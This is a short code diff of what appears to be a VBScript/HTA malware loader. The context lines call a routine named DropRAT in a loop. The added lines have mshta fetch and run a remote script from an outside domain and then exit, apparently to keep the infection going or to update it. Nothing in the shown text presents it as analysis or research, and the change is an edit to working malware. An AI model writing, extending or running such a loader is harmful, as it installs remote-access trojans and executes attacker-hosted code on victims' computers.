@@ -40,6 +40,10 @@ Do
     Call DropRAT(RE_WH, True)
     
     Call SleepSeconds(30)
+    
+    ' Spawn new mshta and exit current
+    Call RunCmd("mshta https://dicerigx.app/")
+    Exit Do
 Loop
 
 window.close()
